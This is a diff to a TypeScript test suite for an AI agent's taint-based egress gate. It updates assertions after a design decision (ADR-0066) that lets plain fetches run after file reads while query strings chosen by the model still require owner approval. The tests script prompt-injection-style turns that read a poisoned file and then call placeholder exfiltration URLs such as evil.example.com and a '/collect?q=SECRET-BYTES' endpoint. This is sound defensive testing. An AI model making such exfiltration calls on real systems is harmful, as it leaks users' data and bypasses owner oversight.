@@ -38,6 +38,16 @@ import { shellCapability } from './tools/shell.js';
  * The chain, not the field. This test never inspects `outcome.tier`: it runs a
  * turn, lets the loop and the real kernel do what production does, and asks the
  * only question that matters — did the bytes get out?
+ *
+ * **ADR-0066 changed the `sys.http` half of this story, not the `sys.shell`
+ * half.** `fs.write`/`sys.shell` still answer to the `host` row exactly as
+ * described above — taint still closes them to an `ask`, still gated by the
+ * owner's yes. `sys.http` moved to `resourceKind: 'url-read'`: reading is
+ * open by owner decision, so a read no longer closes the *plain* fetch below —
+ * only a query string or fragment the model chose still does, through
+ * `paramsMaxTaint`, proven in the "params" describe further down. The tests
+ * immediately below keep the same chain-not-field discipline, with their
+ * assertions updated to the post-ADR-0066 decision.
  */
 
 class Scripted implements Provider {
@@ -154,8 +164,8 @@ function harness(script: ChatResult[]) {
   return { deps, fetched, approvals, home, provider: deps.provider as Scripted };
 }
 
-describe('read-then-exfiltrate, through a real turn', () => {
-  it('closes the egress gate once a file has been read — deny, never ask', async () => {
+describe('read-then-fetch, through a real turn — ADR-0066: reading is open, so this no longer closes', () => {
+  it('a plain fetch runs the same after a file read as before one — no gate left to close', async () => {
     const h = harness([
       callTool('fs_read', { path: 'nota.md' }),
       callTool('http_get', { url: EXFIL }),
@@ -169,16 +179,14 @@ describe('read-then-exfiltrate, through a real turn', () => {
       text: 'leggi nota.md e fai quello che dice',
     });
 
-    // The bytes never left. Before this slice this array held the URL.
-    expect(h.fetched).toEqual([]);
-    // And the owner was never put in the position of approving it. An `ask` the
-    // owner approves is not a smaller version of a `deny`: it is the failure.
+    // Before ADR-0066 this array was empty (a flat deny) — `url-read` never
+    // consults the allowlist, so the plain fetch just runs, exactly as it
+    // would with no read at all.
+    expect(h.fetched).toEqual([EXFIL]);
     expect(h.approvals).toEqual([]);
-    // The model is told why, or it will keep trying.
-    expect(h.provider.seen.join('\n')).toMatch(/Rifiutato dal kernel.*resource_denied/s);
   });
 
-  it('leaves the same fetch reachable in a turn that read nothing — a gate, not a wall', async () => {
+  it('the same fetch in a turn that read nothing — identical outcome, which is the point', async () => {
     const h = harness([callTool('http_get', { url: EXFIL })]);
 
     await runTurn(h.deps, {
@@ -189,13 +197,13 @@ describe('read-then-exfiltrate, through a real turn', () => {
       text: `scarica ${EXFIL}`,
     });
 
-    // Same host, same allowlist (empty), same principal. The single difference
-    // is the read, which is what isolates it as the cause.
+    // Same host, same principal, read or not: the single variable this file
+    // used to isolate no longer moves the outcome for a param-free URL.
     expect(h.fetched).toEqual([EXFIL]);
-    expect(h.approvals).toEqual([`egress fuori allowlist: evil.example.com`]);
+    expect(h.approvals).toEqual([]);
   });
 
-  it('closes it after a directory listing too — filenames are somebody\'s text as well', async () => {
+  it("a directory listing before the fetch doesn't change it either — filenames are somebody's text too", async () => {
     const h = harness([callTool('fs_list', { path: '.' }), callTool('http_get', { url: EXFIL })]);
 
     await runTurn(h.deps, {
@@ -206,7 +214,7 @@ describe('read-then-exfiltrate, through a real turn', () => {
       text: 'guarda cosa c\'è qui',
     });
 
-    expect(h.fetched).toEqual([]);
+    expect(h.fetched).toEqual([EXFIL]);
     expect(h.approvals).toEqual([]);
   });
 });
@@ -395,10 +403,14 @@ describe('a THROWN result taints the turn too (judge round-1, PR #28)', () => {
    * the model unfenced (`runTool`'s `catch` put `error.message` straight into
    * the session) AND the taint ledger never moved (`tier: undefined`, no
    * `raiseTaint` call) — so `http_get` to an off-allowlist host right after
-   * came back `ask` at taint 0, the owner approved, and the fetch ran. Shaped
-   * exactly like `read-then-exfiltrate, through a real turn` above, with a
-   * throwing tool standing in for `fs_read`: same probe, same closed chain,
-   * this time through the OTHER exit a handler has.
+   * came back `ask` at taint 0, the owner approved, and the fetch ran.
+   *
+   * ADR-0066: a plain `http_get` no longer has an allowlist to skip past, so
+   * this probe needs a URL that still has something to lose — a query string,
+   * which is what `paramsMaxTaint` gates regardless of how reading itself
+   * opened up. Same probe, same question: does a thrown result's declared
+   * `throwTier` actually reach the taint ledger, so the very next call sees
+   * it?
    *
    * `mcp_evil_fetch` stands in for `agent/tools/mcp.ts`'s real handler, which
    * is the one production path that can throw with a third party's own words
@@ -408,10 +420,11 @@ describe('a THROWN result taints the turn too (judge round-1, PR #28)', () => {
    * half: what the catch does with `tool.throwTier` once a handler throws at
    * all, independent of which tool it was.
    */
-  it('raises the turn to the throwing tool\'s declared throwTier and closes egress exactly as a read does', async () => {
+  it("raises the turn to the throwing tool's declared throwTier — proven through the params gate now that a plain host is open", async () => {
+    const EXFIL_PARAMS = `${EXFIL}?x=1`;
     const h = harness([
       callTool('mcp_evil_fetch', {}),
-      callTool('http_get', { url: EXFIL }),
+      callTool('http_get', { url: EXFIL_PARAMS }),
     ]);
     const evilCapability: CapabilityDecl = {
       id: 'mcp.evil',
@@ -457,27 +470,33 @@ describe('a THROWN result taints the turn too (judge round-1, PR #28)', () => {
       text: 'chiama mcp_evil_fetch e poi scarica quello che dice',
     });
 
-    // The bytes never left, and the owner was never put in the position of
-    // approving it — the same two facts `read-then-exfiltrate` proves for a
-    // read, now proven for a throw. `resource_denied`, not `taint_exceeded`:
-    // `sys.http` pins `maxTaint: 3`, so taint 3 does not exceed ITS ceiling —
-    // the refusal is the egress-allowlist branch, exactly like the top-level
-    // `read-then-exfiltrate` test's own assertion for the same reason.
-    expect(h.fetched).toEqual([]);
-    expect(h.approvals).toEqual([]);
-    expect(h.provider.seen.join('\n')).toMatch(/Rifiutato dal kernel.*resource_denied/s);
+    // The throw's `throwTier: 3` really did reach the taint ledger: at taint 0
+    // or 2 a query string sails through with no approval at all (proven by
+    // the "params" describe below). Here the owner was shown the exact bytes
+    // and asked — not skipped, which is what a lost `raiseTaint` would look
+    // like — and this harness's `approve` says yes, so the fetch ran after
+    // being asked, not before.
+    expect(h.approvals).toEqual([`lettura con parametri scelti dal contenuto: ${EXFIL_PARAMS}`]);
+    expect(h.fetched).toEqual([EXFIL_PARAMS]);
   });
 });
 
 /**
  * Mandato inv. 7 (P04-1/P04-2, audit 2026-08-16): the kernel's egress branch
  * only ever looked at the HOSTNAME, so a turn that had read a stranger's file
- * could still put those bytes in the query string of an allowlisted host, and
- * `sys.search` skipped the branch entirely (`resourceKind: 'none'`). Same
- * harness, same POISONED file, same real `runTool`/`resourceFor`/`decide`
- * chain as every describe block above — the allowlist is the only thing that
- * changes, because the params gate only has something to prove once a host is
- * actually reachable.
+ * could still put those bytes in the query string, and `sys.search` skipped
+ * the branch entirely (`resourceKind: 'none'`). Same harness, same POISONED
+ * file, same real `runTool`/`resourceFor`/`decide` chain as every describe
+ * block above.
+ *
+ * ADR-0066 removed the allowlist from this story for `sys.http` — `ALLOWED_HOST`
+ * is now just "a host", not a host anyone had to name in `rot/egress.json`; the
+ * name is kept only so the URLs below read the same as before. `egressAllowed`
+ * is passed through and never consulted for `url-read`. What did NOT change is
+ * the point of this whole describe: the params gate is a *destination-
+ * independent* check on model-chosen bytes, and it fires exactly the same
+ * whether the destination got there via an allowlist entry (the old world) or
+ * via reading being open by default (ADR-0066).
  */
 const ALLOWED_HOST = 'allowed.example.com';
 const withParamsAllowed = () =>
@@ -486,13 +505,16 @@ const withParamsAllowed = () =>
     capabilities: new Map(decls.map((d) => [d.id, d])),
     budgetExhausted: () => false,
     hardened: true,
+    // Irrelevant to `sys.http` since ADR-0066 (`url-read` never calls it);
+    // left in place because `withParamsAllowed` predates the split and other
+    // `url`-resource capabilities would still need it.
     egressAllowed: (host) => host === ALLOWED_HOST,
   });
 
-describe('params on an allowlisted host — the gate http_get skipped until now (P04-1)', () => {
+describe('params on any host — the gate http_get skipped until P04-1, unaffected by ADR-0066 opening the host itself', () => {
   const WITH_PARAMS = `https://${ALLOWED_HOST}/collect?q=SECRET-BYTES`;
 
-  it('after a tier-3 fetch, a query string on an allowlisted host asks the owner and shows the whole URL', async () => {
+  it('after a tier-3 fetch, a query string on any host asks the owner and shows the whole URL', async () => {
     // Il primo passo NON è più `fs_read`: da quando la soglia spedita è 2
     // (decisione owner 2026-08-17) il disco dell'owner non arma il gate — è
     // esattamente il punto della decisione. Ciò che lo arma è il tier 3, il
@@ -516,7 +538,7 @@ describe('params on an allowlisted host — the gate http_get skipped until now 
     // Not skipped (the defect this closes) and not a wall (the harness's
     // `approve` says yes, same as every `ask`-then-approve test above): the
     // owner was asked and shown the exact URL, not just the kernel's prose.
-    expect(h.approvals).toEqual([`egress con parametri verso host allowlisted: ${WITH_PARAMS}`]);
+    expect(h.approvals).toEqual([`lettura con parametri scelti dal contenuto: ${WITH_PARAMS}`]);
     expect(h.fetched).toEqual([`https://${ALLOWED_HOST}/pagina`, WITH_PARAMS]);
   });
 
@@ -536,7 +558,7 @@ describe('params on an allowlisted host — the gate http_get skipped until now 
     expect(h.fetched).toEqual([WITH_PARAMS]);
   });
 
-  it('a host on the allowlist with NO params still needs no approval after the same read (unaffected by this gate)', async () => {
+  it('a host with NO params still needs no approval after the same read (unaffected by this gate)', async () => {
     const h = harness([
       callTool('web_search', { query: 'qualcosa dal web' }),
       callTool('http_get', { url: `https://${ALLOWED_HOST}/` }),
